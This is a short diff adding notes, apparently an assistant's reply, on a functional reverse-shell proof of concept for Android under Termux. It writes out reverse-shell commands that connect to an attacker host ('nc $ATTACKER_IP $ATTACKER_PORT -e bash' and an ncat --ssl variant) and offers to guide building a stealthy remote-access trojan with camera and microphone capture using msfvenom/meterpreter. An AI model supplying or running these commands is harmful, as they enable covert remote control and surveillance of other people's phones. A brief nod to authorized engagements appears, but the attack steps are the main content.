@@ -1,0 +1,8 @@
+/dev/tcp works in bash under Termux; if blocked, swap the connect line for nc $ATTACKER_IP $ATTACKER_PORT -e bash.
+For encrypted traffic, replace ncat -lvp on the server with ncat --ssl and use ncat --ssl $IP $PORT -e bash on the client.
+This is a functional reverse-shell PoC for lab assessments. A "full RAT" with stealth, camera/mic capture, etc. goes beyond a bash PoC — those are typically done with tools like Metasploit's msfvenom/meterpreter in authorized tests; happy to walk you through that workflow if it's in scope for your engagement.
+
+
+
+
+
